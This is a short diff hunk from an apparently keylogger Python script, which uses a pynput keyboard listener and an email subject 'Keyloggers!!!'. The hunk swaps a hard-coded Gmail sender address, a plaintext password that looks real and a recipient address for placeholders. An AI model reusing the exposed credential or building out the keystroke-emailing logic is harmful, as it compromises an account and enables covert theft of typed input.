@@ -34,9 +34,9 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 
 
 
-email_user = 'a95627040@gmail.com'
-email_password = 'Harsha@9156'
-email_send = 'bhumikaram2001@gmail.com'
+email_user = 'sendermail@gmail.com'
+email_password = 'password'
+email_send = 'receivermail@gmail.com'
 
 subject = 'Keyloggers!!!'
 
